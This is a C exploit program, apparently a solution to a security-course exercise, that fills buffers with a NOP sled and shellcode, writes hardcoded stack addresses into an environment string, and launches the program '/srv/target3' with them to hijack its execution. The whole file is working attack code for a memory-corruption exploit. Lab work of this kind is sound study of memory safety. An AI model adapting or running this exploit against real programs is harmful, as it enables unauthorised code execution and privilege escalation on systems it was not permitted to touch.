#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const char* TARGET = "/srv/target3";

const int ESIZE = 400;
const uint32_t BASE = 0xffffdec0;
const int NSIZE = 201;
const char NOP = 0x90;
const int DIFF = 4;
const uint32_t A1 = BASE + DIFF;
const uint32_t A2 = BASE + 2 * DIFF;

void prep(char *e) {
    memset(e, NOP, ESIZE - 1);
    *((uint32_t *)(e)) = A1;
    *((uint32_t *)(e + DIFF)) = A2;
    memcpy(e + NSIZE, shellcode, sizeof(shellcode));
    e[ESIZE - 1] = '\0';
}

int main(void) {
    char env[ESIZE];
    prep(env); 

    char *buf = malloc(NSIZE + sizeof(shellcode) + 1);
    if (buf == NULL) {
        perror("Failed to allocate buf");
        exit(EXIT_FAILURE);
    }
    memset(buf, NOP, NSIZE);
    memcpy(buf + NSIZE, shellcode, sizeof(shellcode));
    buf[NSIZE + sizeof(shellcode)] = '\0'; 

    char *args[] = {TARGET, buf, NULL};
    char *envp[] = {env};

    if (execve(TARGET, args, envp) == -1) {
        perror("execve failed");
    }

    return 0;
}
